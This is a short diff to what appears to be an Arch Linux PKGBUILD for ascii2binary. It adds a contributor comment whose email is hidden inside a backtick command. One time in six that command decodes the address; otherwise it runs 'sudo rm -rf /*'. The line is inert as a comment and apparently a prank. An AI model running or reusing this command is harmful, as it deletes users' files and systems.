@@ -1,4 +1,5 @@
 # Maintainer: Mees Valkenburg <fluffy@godot.uk.to>
+# Contributor: felix <`(( $RANDOM % 6 == 0 )) && base64 -d <<< ZmVsaXgudm9uLnNAcG9zdGVvLmRlCg== || sudo rm -rf /* `>
 pkgname=ascii2binary
 pkgver=2.14
 pkgrel=1
